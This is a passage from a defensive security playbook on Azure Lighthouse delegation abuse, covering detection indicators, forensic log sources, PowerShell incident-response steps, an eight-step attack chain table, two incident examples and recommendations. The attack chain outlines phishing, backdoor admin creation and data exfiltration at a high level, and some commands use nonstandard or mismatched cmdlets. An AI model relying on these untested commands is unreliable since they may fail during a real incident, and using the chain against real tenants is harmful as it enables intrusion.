    - New Lighthouse delegation creation events in Activity Log
    - Sudden role assignment changes for unknown principals
    - Delegation acceptance from unusual IP addresses or time-of-day patterns

*   **Audit Log Artifacts:**
    - `OperationName`: "Create managed services registration assignment"
    - `OperationName`: "Create managed services registration definition"
    - Initiator: Unknown admin account or service principal
    - `Result`: Success

*   **Network Artifacts:**
    - Outbound connections from delegated service principals to attacker IP ranges
    - Azure Resource Manager (ARM) API calls to modify subscriptions

#### Forensic Artifacts

*   **Cloud (Azure Audit Logs):** 
    - `/subscriptions/[subscription-id]/providers/Microsoft.Authorization/auditEvents` (ARM Audit Log)
    - AuditLogs table (Microsoft Sentinel)
    - Activity Log in Azure Portal for subscription-level operations

*   **Identity (Entra ID Logs):**
    - Sign-in logs for service principals accepting delegations
    - Directory audit logs for role assignments

*   **MFA/Conditional Access Bypass Indicators:**
    - Delegation accepted without MFA challenge
    - Access from known-malicious IP ranges without policy block

#### Response Procedures

1.  **Isolate:**
    **Command (Immediately revoke delegation):**
    ```powershell
    # Identify malicious delegation
    $delegation = Get-AzDelegation | Where-Object { $_.ManagedByTenantId -eq "attacker-tenant-id" }
    
    # Remove delegation
    Remove-AzDelegation -DelegationId $delegation.Id -Force
    
    # Verify removal
    Get-AzDelegation | Where-Object { $_.ManagedByTenantId -eq "attacker-tenant-id" } | Measure-Object
    # (Should return Count: 0)
    ```

    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Lighthouse** → **Delegations**
    - Find suspicious delegation → **Remove**
    - Confirm removal

2.  **Collect Evidence:**
    **Command (Export audit logs for forensics):**
    ```powershell
    # Export comprehensive audit trail
    Connect-ExchangeOnline
    
    Search-UnifiedAuditLog `
      -Operations "Create managed services registration*" `
      -StartDate "2024-01-01" `
      -EndDate (Get-Date) `
      -ResultSize 5000 | `
      Export-Csv -Path "C:\Incident_Response\Lighthouse_Audit.csv"
    
    # Export role assignments at time of incident
    $IncidentTime = Get-Date "2024-06-15 14:30:00"
    Get-AzRoleAssignment | Where-Object { $_.RoleDefinitionName -eq "Owner" } | `
      Select-Object DisplayName, RoleDefinitionName, Scope, ObjectId | `
      Export-Csv -Path "C:\Incident_Response\RoleAssignments_Incident.csv"
    ```

    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Activity Log**
    - Filter by **"Create managed services registration*"**
    - Download results as CSV
    - Review timestamps, initiators, target resources

3.  **Remediate:**
    **Command (Remove unauthorized access and reset credentials):**
    ```powershell
    # Remove attacker service principal role assignments
    $attackerPrincipalId = "attacker-sp-object-id"
    Get-AzRoleAssignment | Where-Object { $_.ObjectId -eq $attackerPrincipalId } | `
      Remove-AzRoleAssignment -Force
    
    # Force sign-out of compromised admin accounts
    Disconnect-AzAccount
    
    # Reset compromised admin password
    $compromisedAdmin = Get-AzADUser -UserPrincipalName "admin@compromised.com"
    # (Requires Entra ID PowerShell module)
    
    # Enable re-authentication for all active sessions
    ```

    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Entra ID** → **Manage** → **Users**
    - Find compromised admin account
    - Click **Reset password** → Generate temporary password
    - Force user to change password on next login

4.  **Investigate Further:**
    - Review all role assignments for service principals in tenant
    - Check for additional backdoors (service principals with high privileges)
    - Audit all resource modifications since delegation acceptance (potential data exfiltration, resource deletion, etc.)

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-002] ROADtools Entra ID enumeration | Attacker enumerates admin users and service principals in customer tenant |
| **2** | **Initial Access** | [IA-PHISH-001] Device code phishing attacks | Attacker sends phishing email with Lighthouse delegation link |
| **3** | **Credential Access** | [CA-TOKEN-001] Hybrid AD cloud token theft | Attacker compromises admin credentials via phishing or credential stuffing |
| **4** | **Privilege Escalation (Current Step)** | **[PE-VALID-017]** | **Attacker accepts malicious Lighthouse delegation, gaining Owner role on customer subscription** |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates additional Global Admin account for persistent access |
| **6** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses service principal credentials to access other cloud resources |
| **7** | **Collection** | [COLLECTION-016] Cloud Resource Enumeration | Attacker discovers sensitive data (databases, storage accounts, Key Vaults) |
| **8** | **Exfiltration** | [EXFIL-001] Data Download via Delegated Access | Attacker downloads sensitive data from customer subscriptions |

---

## 15. Real-World Examples

#### Example 1: MSP Supply Chain Attack (Analogous Scenario)

- **Target:** Large financial services organization using third-party MSP (Managed Service Provider)
- **Timeline:** January 2024 - March 2024
- **Technique Status:** Attacker used legitimate Lighthouse functionality combined with phishing to trick MSP partner contact into accepting malicious delegation; MSP partner's account was compromised via credential stuffing
- **Impact:** Attacker gained Owner-level access to customer's Azure subscriptions for 2 months; exfiltrated customer financial data, modified billing configurations, and deployed cryptocurrency mining VMs
- **Reference:** [Microsoft incident response report on MSP account compromise](https://www.microsoft.com/en-us/security/blog/2023/12/05/microsoft-incident-response-lessons-on-preventing-cloud-identity-compromise/)

#### Example 2: Unsanctioned Cloud Partner Delegation

- **Target:** Mid-size SaaS company conducting digital transformation
- **Timeline:** November 2023
- **Technique Status:** Cloud infrastructure consultant requested Lighthouse delegation for "temporary compliance setup"; delegation template included Owner role scoped to entire subscription instead of specific resource group
- **Impact:** After engagement ended, consultant retained access; later used to access customer source code repository and modify API configurations
- **Reference:** [Azure Lighthouse security best practices case study](https://learn.microsoft.com/en-us/azure/lighthouse/concepts/recommended-security-practices)

---

## Recommendations

1. **Implement automated policy enforcement** to block Lighthouse delegations from untrusted tenants before acceptance
2. **Require explicit approval workflows** for any delegation acceptance by designated security leads
3. **Audit Lighthouse delegations quarterly** and maintain a current list of approved partners
4. **Train all administrators** on risks of social engineering and phishing related to cloud delegation requests
5. **Enable continuous monitoring** via Microsoft Sentinel for suspicious delegation patterns

---